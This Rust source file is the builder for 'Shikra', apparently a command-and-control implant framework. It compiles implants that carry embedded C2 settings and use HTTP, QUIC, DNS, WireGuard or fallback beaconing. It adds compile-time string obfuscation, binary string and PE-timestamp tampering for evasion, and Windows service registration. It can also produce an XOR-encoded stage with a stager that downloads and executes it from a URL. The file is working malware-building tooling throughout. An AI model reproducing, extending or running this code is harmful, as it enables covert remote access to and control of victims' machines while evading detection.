use anyhow::{Context, Result};
use clap::{Parser, ValueEnum};
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
enum TargetOs {
    Windows,
    Linux,
    Macos,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
enum TargetArch {
    X86_64,
    X86,
    Aarch64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
enum Mode {
    Session,
    Beacon,
    Quic,
    Dns,
    #[value(name = "wireguard", alias = "wire-guard")]
    WireGuard,
    /// Try transports in the order given by --fallback until one connects.
    Fallback,
}

#[derive(Debug, Parser)]
#[command(name = "shikra-builder", version, about = "Shikra implant builder")]
struct Cli {
    /// Build name used for the output artifact.
    #[arg(long)]
    name: String,

    #[arg(long, value_enum, default_value_t = Mode::Session)]
    mode: Mode,

    #[arg(long, value_enum)]
    os: Option<TargetOs>,

    #[arg(long, value_enum)]
    arch: Option<TargetArch>,

    /// Explicit Rust target triple (overrides --os/--arch).
    #[arg(long)]
    target: Option<String>,

    #[arg(long)]
    c2_url: Option<String>,

    #[arg(long)]
    http_url: Option<String>,

    /// DNS beacon server address, e.g. 127.0.0.1:5353
    /// QUIC beacon server address, e.g. 127.0.0.1:8444
    #[arg(long)]
    quic_url: Option<String>,

    #[arg(long)]
    dns_url: Option<String>,

    /// DNS zone appended to query names.
    #[arg(long, default_value = "dns.shikra")]
    dns_zone: String,

    /// WireGuard beacon server address, e.g. 127.0.0.1:51820
    #[arg(long)]
    wg_url: Option<String>,

    /// Server WireGuard static public key as hex (32 bytes).
    #[arg(long)]
    wg_server_public: Option<String>,

    /// Comma-separated transport order for fallback builds, e.g.
    /// "quic,http,dns,wireguard". Required for --mode fallback.
    #[arg(long)]
    fallback: Option<String>,

    /// Path to the enrollment token file (from the server state dir).
    #[arg(long)]
    enroll_token_file: Option<PathBuf>,

    /// Enrollment token value (alternative to file).
    #[arg(long)]
    enroll_token: Option<String>,

    /// Path to a profiles.json (or JSON array) embedded for beacon rotation.
    #[arg(long)]
    profiles_file: Option<PathBuf>,

    /// Path to the pinned server identity public key (hex).
    #[arg(long)]
    server_identity_file: Option<PathBuf>,

    /// Server identity public key hex (alternative to file).
    #[arg(long)]
    server_identity: Option<String>,

    /// Path to the CA certificate PEM.
    #[arg(long)]
    ca_cert: Option<PathBuf>,

    #[arg(long, default_value = "localhost")]
    tls_domain: String,

    #[arg(long, default_value_t = 15)]
    heartbeat_secs: u64,

    #[arg(long, default_value_t = 5)]
    jitter_secs: u64,

    /// Directory for build artifacts.
    #[arg(long, default_value = "./builds")]
    output_dir: PathBuf,

    /// Build in release mode (required for real operations).
    #[arg(long, default_value_t = true)]
    release: bool,

    /// Pin server poll interval for beacon builds.
    #[arg(long)]
    poll_interval_secs: Option<u64>,

    /// Seed (hex or decimal u64) for compile-time string obfuscation.
    /// Defaults to a per-build random value; set for reproducible builds.
    #[arg(long)]
    obf_seed: Option<String>,

    /// Disable compile-time string obfuscation.
    #[arg(long, default_value_t = false)]
    no_obfuscation: bool,

    /// Also produce a staged-delivery pair: `<name>.stage` (encoded implant)
    /// and `<name>-stager` (bootstrap that downloads and executes it).
    #[arg(long, default_value_t = false)]
    stager: bool,

    /// Public URL the stager downloads the stage from, e.g.
    /// http://10.0.0.1:8080/cdn/mypayload.stage. Required with --stager.
    #[arg(long)]
    stage_url: Option<String>,

    /// Extra arguments forwarded to the staged implant by the stager.
    #[arg(long, default_value = "")]
    stage_args: String,

    /// Session transport override: connect through this named pipe
    /// (`\\HOST\pipe\name` on Windows) or Unix socket path instead of TCP.
    #[arg(long)]
    pipe: Option<String>,

    /// Build a Windows service EXE that registers with the SCM under this
    /// name (Windows targets only).
    #[arg(long)]
    service: Option<String>,

    /// Replace literal bytes in the built binary (repeatable, OLD=NEW).
    /// NEW must not be longer than OLD.
    #[arg(long = "replace-string", value_name = "OLD=NEW")]
    replace_strings: Vec<String>,

    /// Overwrite the PE COFF timestamp: a unix timestamp, "now" or "random".
    #[arg(long)]
    pe_timestamp: Option<String>,

    /// Unix timestamp after which the agent terminates (0 = never).
    #[arg(long, default_value_t = 0)]
    killdate: u64,

    /// Agent-local working-hours window, e.g. "9:00-17:00" (empty = always).
    #[arg(long, default_value = "")]
    working_hours: String,

    /// Do not invoke cargo; only render the embedded config JSON.
    #[arg(long)]
    dry_run: bool,
}

#[derive(Debug, Serialize)]
struct EmbeddedConfig {
    mode: String,
    #[serde(default)]
    profiles: serde_json::Value,
    c2_url: String,
    http_url: String,
    quic_url: String,
    dns_url: String,
    dns_zone: String,
    wg_url: String,
    wg_server_public: String,
    #[serde(default)]
    fallback_order: String,
    enroll_token: String,
    server_identity_hex: String,
    ca_pem: String,
    tls_domain: String,
    heartbeat_secs: u64,
    jitter_secs: u64,
    max_runtime_secs: Option<u64>,
    poll_interval_secs: Option<u64>,
    killdate_unix: u64,
    working_hours: String,
    service_name: String,
    #[serde(default)]
    pipe_path: String,
}

/// Applies string replacements and PE header malleability to a built binary.
fn apply_binary_malleability(path: &Path, cli: &Cli, is_windows_target: bool) -> Result<()> {
    if cli.replace_strings.is_empty() && cli.pe_timestamp.is_none() {
        return Ok(());
    }
    let mut bytes =
        std::fs::read(path).with_context(|| format!("failed to read {}", path.display()))?;
    let mut changed = false;

    for spec in &cli.replace_strings {
        let (old, new) = spec
            .split_once('=')
            .ok_or_else(|| anyhow::anyhow!("--replace-string expects OLD=NEW, got {spec:?}"))?;
        if old.is_empty() {
            anyhow::bail!("--replace-string old value must not be empty");
        }
        if new.len() > old.len() {
            anyhow::bail!(
                "--replace-string new value ({}) must not be longer than old ({})",
                new.len(),
                old.len()
            );
        }
        changed |= replace_bytes(&mut bytes, old.as_bytes(), new.as_bytes()) > 0;
    }

    if let Some(spec) = &cli.pe_timestamp {
        if !is_windows_target {
            tracing::warn!("--pe-timestamp ignored for non-Windows targets");
        } else {
            let timestamp = match spec.trim().to_ascii_lowercase().as_str() {
                "now" => std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|duration| duration.as_secs() as u32)
                    .unwrap_or_default(),
                "random" => rand_u32(),
                other => other
                    .parse::<u32>()
                    .with_context(|| format!("invalid --pe-timestamp value {other:?}"))?,
            };
            if patch_pe_timestamp(&mut bytes, timestamp)? {
                changed = true;
            } else {
                tracing::warn!("--pe-timestamp: no PE header found in artifact");
            }
        }
    }

    if changed {
        std::fs::write(path, &bytes)
            .with_context(|| format!("failed to write patched binary {}", path.display()))?;
    }
    Ok(())
}

/// Length-preserving byte replacement; returns how many occurrences changed.
fn replace_bytes(bytes: &mut [u8], old: &[u8], new: &[u8]) -> usize {
    if old.is_empty() || new.len() > old.len() {
        return 0;
    }
    let mut replaced = 0usize;
    let mut index = 0usize;
    while index + old.len() <= bytes.len() {
        if &bytes[index..index + old.len()] == old {
            bytes[index..index + new.len()].copy_from_slice(new);
            bytes[index + new.len()..index + old.len()].fill(0);
            replaced += 1;
            index += old.len();
        } else {
            index += 1;
        }
    }
    replaced
}

/// Overwrites the COFF `TimeDateStamp`; returns whether a PE header was found.
fn patch_pe_timestamp(bytes: &mut [u8], timestamp: u32) -> Result<bool> {
    if bytes.len() < 0x40 || &bytes[0..2] != b"MZ" {
        return Ok(false);
    }
    let pe_offset = u32::from_le_bytes(bytes[0x3c..0x40].try_into().expect("pe offset")) as usize;
    if bytes.len() < pe_offset + 12 || &bytes[pe_offset..pe_offset + 4] != b"PE\0\0" {
        return Ok(false);
    }
    let stamp = pe_offset + 8;
    bytes[stamp..stamp + 4].copy_from_slice(&timestamp.to_le_bytes());
    Ok(true)
}

fn rand_u32() -> u32 {
    use std::hash::{BuildHasher, Hasher};
    std::collections::hash_map::RandomState::new()
        .build_hasher()
        .finish() as u32
}

fn workspace_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn target_triple(
    os: Option<TargetOs>,
    arch: Option<TargetArch>,
    explicit: Option<String>,
) -> Result<String> {
    if let Some(explicit) = explicit {
        return Ok(explicit);
    }
    let host_os = std::env::consts::OS;
    let host_arch = std::env::consts::ARCH;

    let os = os.unwrap_or(match host_os {
        "windows" => TargetOs::Windows,
        "macos" => TargetOs::Macos,
        _ => TargetOs::Linux,
    });
    let arch = arch.unwrap_or(match host_arch {
        "aarch64" => TargetArch::Aarch64,
        _ => TargetArch::X86_64,
    });

    let triple = match (os, arch) {
        (TargetOs::Windows, TargetArch::X86) => "i686-pc-windows-gnu",
        (TargetOs::Linux, TargetArch::X86) => "i686-unknown-linux-musl",
        (TargetOs::Macos, TargetArch::X86) => {
            anyhow::bail!("32-bit macOS targets are not supported")
        }
        (TargetOs::Windows, TargetArch::X86_64) => "x86_64-pc-windows-gnu",
        (TargetOs::Windows, TargetArch::Aarch64) => "aarch64-pc-windows-gnullvm",
        (TargetOs::Linux, TargetArch::X86_64) => "x86_64-unknown-linux-musl",
        (TargetOs::Linux, TargetArch::Aarch64) => "aarch64-unknown-linux-musl",
        (TargetOs::Macos, TargetArch::X86_64) => "x86_64-apple-darwin",
        (TargetOs::Macos, TargetArch::Aarch64) => "aarch64-apple-darwin",
    };
    Ok(triple.to_string())
}

fn read_required(value: Option<String>, path: Option<PathBuf>, label: &str) -> Result<String> {
    if let Some(value) = value {
        if !value.is_empty() {
            return Ok(value);
        }
    }
    if let Some(path) = path {
        return Ok(std::fs::read_to_string(&path)
            .with_context(|| format!("failed to read {label} from {}", path.display()))?
            .trim()
            .to_string());
    }
    anyhow::bail!("{label} is required (--{label}-file or --{label})")
}

fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .init();

    let cli = Cli::parse();
    let triple = target_triple(cli.os, cli.arch, cli.target.clone())?;

    let enroll_token = read_required(
        cli.enroll_token.clone(),
        cli.enroll_token_file.clone(),
        "enroll-token",
    )?;
    let server_identity_hex = read_required(
        cli.server_identity.clone(),
        cli.server_identity_file.clone(),
        "server-identity",
    )?;

    let ca_pem = match &cli.ca_cert {
        Some(path) => std::fs::read_to_string(path)
            .with_context(|| format!("failed to read CA cert {}", path.display()))?,
        None => {
            anyhow::bail!("--ca-cert is required to bake the pinned CA into the build");
        }
    };

    let (mode, c2_url, http_url, quic_url, dns_url, wg_url, wg_server_public) = match cli.mode {
        Mode::Session => {
            let url = cli
                .c2_url
                .clone()
                .context("--c2-url is required for session builds")?;
            (
                "session".to_string(),
                url,
                String::new(),
                String::new(),
                String::new(),
                String::new(),
                String::new(),
            )
        }
        Mode::Beacon => {
            let url = cli
                .http_url
                .clone()
                .context("--http-url is required for beacon builds")?;
            (
                "beacon".to_string(),
                String::new(),
                url,
                String::new(),
                String::new(),
                String::new(),
                String::new(),
            )
        }
        Mode::Quic => {
            let url = cli
                .quic_url
                .clone()
                .context("--quic-url is required for quic builds")?;
            (
                "quic".to_string(),
                String::new(),
                String::new(),
                url,
                String::new(),
                String::new(),
                String::new(),
            )
        }
        Mode::Dns => {
            let url = cli
                .dns_url
                .clone()
                .context("--dns-url is required for dns builds")?;
            (
                "dns".to_string(),
                String::new(),
                String::new(),
                String::new(),
                url,
                String::new(),
                String::new(),
            )
        }
        Mode::WireGuard => {
            let url = cli
                .wg_url
                .clone()
                .context("--wg-url is required for wireguard builds")?;
            let public = cli
                .wg_server_public
                .clone()
                .context("--wg-server-public is required for wireguard builds")?;
            (
                "wireguard".to_string(),
                String::new(),
                String::new(),
                String::new(),
                String::new(),
                url,
                public,
            )
        }
        Mode::Fallback => {
            cli.fallback
                .clone()
                .filter(|order| !order.trim().is_empty())
                .context(
                    "--fallback is required for fallback builds, e.g. \"quic,http,dns,wireguard\"",
                )?;
            (
                "fallback".to_string(),
                String::new(),
                cli.http_url.clone().unwrap_or_default(),
                cli.quic_url.clone().unwrap_or_default(),
                cli.dns_url.clone().unwrap_or_default(),
                cli.wg_url.clone().unwrap_or_default(),
                cli.wg_server_public.clone().unwrap_or_default(),
            )
        }
    };

    let profiles = match &cli.profiles_file {
        Some(path) => {
            let raw = std::fs::read_to_string(path)
                .with_context(|| format!("failed to read profiles file {}", path.display()))?;
            let value: serde_json::Value = serde_json::from_str(&raw)
                .with_context(|| format!("invalid profiles JSON in {}", path.display()))?;
            let list = value.get("profiles").cloned().unwrap_or(value);
            if !list.is_array() || list.as_array().map(|a| a.is_empty()).unwrap_or(true) {
                anyhow::bail!(
                    "profiles file {} must contain a non-empty profiles array",
                    path.display()
                );
            }
            list
        }
        None => serde_json::Value::Array(Vec::new()),
    };

    let embedded = EmbeddedConfig {
        mode,
        profiles,
        c2_url,
        http_url,
        quic_url,
        dns_url,
        dns_zone: cli.dns_zone.clone(),
        wg_url,
        wg_server_public,
        fallback_order: cli.fallback.clone().unwrap_or_default(),
        enroll_token,
        server_identity_hex,
        ca_pem,
        tls_domain: cli.tls_domain.clone(),
        heartbeat_secs: cli.heartbeat_secs,
        jitter_secs: cli.jitter_secs,
        max_runtime_secs: None,
        poll_interval_secs: cli.poll_interval_secs,
        killdate_unix: cli.killdate,
        working_hours: cli.working_hours.trim().to_string(),
        service_name: cli.service.clone().unwrap_or_default(),
        pipe_path: cli.pipe.clone().unwrap_or_default(),
    };
    let embedded_json = serde_json::to_string(&embedded)?;

    if cli.dry_run {
        println!("{embedded_json}");
        return Ok(());
    }

    std::fs::create_dir_all(&cli.output_dir)
        .with_context(|| format!("failed to create {}", cli.output_dir.display()))?;

    let root = workspace_root();
    let obf_seed = if cli.no_obfuscation {
        None
    } else {
        Some(cli.obf_seed.clone().unwrap_or_else(random_obf_seed))
    };
    let mut command = Command::new(std::env::var("CARGO").unwrap_or_else(|_| "cargo".into()));
    command
        .current_dir(&root)
        .arg("build")
        .arg("-p")
        .arg("shikra-implant")
        .arg("--bin")
        .arg("shikra-implant")
        .arg("--target")
        .arg(&triple)
        .env("SHIKRA_EMBEDDED_CONFIG_JSON", &embedded_json);
    if let Some(seed) = &obf_seed {
        command.env("SHIKRA_OBF_SEED", seed);
    }
    if cli.release {
        command.arg("--release");
    }

    tracing::info!(target = %triple, "building implant");
    let status = command.status().context("failed to invoke cargo")?;
    if !status.success() {
        anyhow::bail!(
            "cargo build failed for target {triple}. Install the target with \
             `rustup target add {triple}` and a linker (e.g. cargo-zigbuild / cross)."
        );
    }

    let profile = if cli.release { "release" } else { "debug" };
    let binary_name = if triple.contains("windows") {
        "shikra-implant.exe"
    } else {
        "shikra-implant"
    };
    let source = root
        .join("target")
        .join(&triple)
        .join(profile)
        .join(binary_name);
    if !source.exists() {
        anyhow::bail!("build artifact not found at {}", source.display());
    }

    let artifact_name = if triple.contains("windows") {
        format!("{}.exe", cli.name)
    } else {
        cli.name.clone()
    };
    let destination = cli.output_dir.join(&artifact_name);
    std::fs::copy(&source, &destination)
        .with_context(|| format!("failed to copy artifact to {}", destination.display()))?;

    apply_binary_malleability(&destination, &cli, triple.contains("windows"))?;

    let bytes = std::fs::read(&destination)?;
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    let sha256 = hex(&hasher.finalize());

    let mut summary = serde_json::json!({
        "name": cli.name,
        "target": triple,
        "path": destination.display().to_string(),
        "size": bytes.len(),
        "sha256": sha256,
        "obf_seed": obf_seed,
    });

    if cli.stager {
        let stage_url = cli
            .stage_url
            .clone()
            .context("--stage-url is required with --stager")?;
        let stage = build_stager(&root, &triple, &cli, &bytes, &stage_url, &obf_seed, profile)?;
        summary["stage"] = serde_json::json!({
            "encoded_path": stage.encoded_path.display().to_string(),
            "encoded_size": stage.encoded_size,
            "key": stage.key,
            "stager_path": stage.stager_path.display().to_string(),
            "stager_size": stage.stager_size,
        });
    }

    println!("{summary}");
    Ok(())
}

struct StagerArtifacts {
    encoded_path: PathBuf,
    encoded_size: usize,
    key: String,
    stager_path: PathBuf,
    stager_size: usize,
}

fn random_stage_spec() -> Result<(shikra_evasion::EncoderSpec, String)> {
    let spec = shikra_evasion::Encoder::random("xor").context("failed to generate stage key")?;
    let key_hex = match &spec {
        shikra_evasion::EncoderSpec::Xor { key } => shikra_transport::tls::hex_encode(key),
        _ => unreachable!("random xor spec is always Xor"),
    };
    Ok((spec, key_hex))
}

#[allow(clippy::too_many_arguments)]
fn build_stager(
    root: &Path,
    triple: &str,
    cli: &Cli,
    implant_bytes: &[u8],
    stage_url: &str,
    obf_seed: &Option<String>,
    profile: &str,
) -> Result<StagerArtifacts> {
    let (spec, key) = random_stage_spec()?;
    let encoded =
        shikra_evasion::encode(&spec, implant_bytes).context("failed to encode stage payload")?;

    let encoded_name = format!("{}.stage", cli.name);
    let encoded_path = cli.output_dir.join(&encoded_name);
    std::fs::write(&encoded_path, &encoded)
        .with_context(|| format!("failed to write {}", encoded_path.display()))?;

    let mut command = Command::new(std::env::var("CARGO").unwrap_or_else(|_| "cargo".into()));
    command
        .current_dir(root)
        .arg("build")
        .arg("-p")
        .arg("shikra-implant")
        .arg("--bin")
        .arg("shikra-stager")
        .arg("--target")
        .arg(triple)
        .env("SHIKRA_STAGER_URL", stage_url)
        .env("SHIKRA_STAGER_KEY", &key)
        .env("SHIKRA_STAGER_ARGS", &cli.stage_args);
    if let Some(seed) = obf_seed {
        command.env("SHIKRA_OBF_SEED", seed);
    }
    if cli.release {
        command.arg("--release");
    }

    tracing::info!(target = triple, "building stager");
    let status = command
        .status()
        .context("failed to invoke cargo for stager")?;
    if !status.success() {
        anyhow::bail!("cargo build failed for the stager binary");
    }

    let stager_binary = if triple.contains("windows") {
        "shikra-stager.exe"
    } else {
        "shikra-stager"
    };
    let stager_source = root
        .join("target")
        .join(triple)
        .join(profile)
        .join(stager_binary);
    if !stager_source.exists() {
        anyhow::bail!("stager artifact not found at {}", stager_source.display());
    }
    let stager_name = if triple.contains("windows") {
        format!("{}-stager.exe", cli.name)
    } else {
        format!("{}-stager", cli.name)
    };
    let stager_path = cli.output_dir.join(&stager_name);
    std::fs::copy(&stager_source, &stager_path)
        .with_context(|| format!("failed to copy stager to {}", stager_path.display()))?;
    let stager_size = std::fs::metadata(&stager_path)?.len() as usize;

    Ok(StagerArtifacts {
        encoded_path,
        encoded_size: encoded.len(),
        key,
        stager_path,
        stager_size,
    })
}

fn random_obf_seed() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_nanos() as u64)
        .unwrap_or(0x9E37_79B9_7F4A_7C15);
    let mixed =
        nanos.wrapping_mul(0x9E37_79B9_7F4A_7C15).rotate_left(17) ^ std::process::id() as u64;
    format!("0x{mixed:016x}")
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn maps_targets() {
        assert_eq!(
            target_triple(Some(TargetOs::Linux), Some(TargetArch::X86_64), None).unwrap(),
            "x86_64-unknown-linux-musl"
        );
        assert_eq!(
            target_triple(Some(TargetOs::Windows), Some(TargetArch::Aarch64), None).unwrap(),
            "aarch64-pc-windows-gnullvm"
        );
        assert_eq!(
            target_triple(None, None, Some("custom-triple".into())).unwrap(),
            "custom-triple"
        );
    }

    #[test]
    fn read_required_prefers_value() {
        let value = read_required(Some("token".into()), None, "enroll-token").unwrap();
        assert_eq!(value, "token");
    }

    #[test]
    fn replace_bytes_is_length_preserving() {
        let mut bytes = b"hello world hello".to_vec();
        let replaced = replace_bytes(&mut bytes, b"hello", b"HE");
        assert_eq!(replaced, 2);
        assert_eq!(bytes, b"HE\0\0\0 world HE\0\0\0");
        // Longer replacements are rejected.
        assert_eq!(replace_bytes(&mut bytes, b"HE", b"LONG"), 0);
    }

    #[test]
    fn patches_pe_timestamp() {
        let mut image = vec![0u8; 0x100];
        image[0..2].copy_from_slice(b"MZ");
        image[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        image[0x80..0x84].copy_from_slice(b"PE\0\0");
        assert!(patch_pe_timestamp(&mut image, 0x1234_5678).unwrap());
        assert_eq!(
            u32::from_le_bytes(image[0x88..0x8c].try_into().unwrap()),
            0x1234_5678
        );
        // Non-PE buffers are reported, not patched.
        let mut plain = vec![0u8; 32];
        assert!(!patch_pe_timestamp(&mut plain, 1).unwrap());
    }

    #[test]
    fn read_required_reads_file() {
        let dir = std::env::temp_dir().join(format!("shikra-builder-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("token.txt");
        std::fs::write(&path, "file-token\n").unwrap();
        let value = read_required(None, Some(path), "enroll-token").unwrap();
        assert_eq!(value, "file-token");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
